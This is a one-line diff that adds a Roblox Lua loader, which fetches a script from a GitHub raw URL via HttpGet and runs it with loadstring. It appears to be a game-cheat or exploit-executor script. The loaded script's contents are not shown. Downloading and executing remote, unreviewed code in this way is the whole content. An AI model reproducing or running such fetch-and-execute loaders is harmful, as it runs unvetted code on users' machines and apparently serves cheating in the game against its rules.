@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MinionRoblox/THE-HUNT-NEED-MORE-FRIENDS/main/The%20Hunt"))()
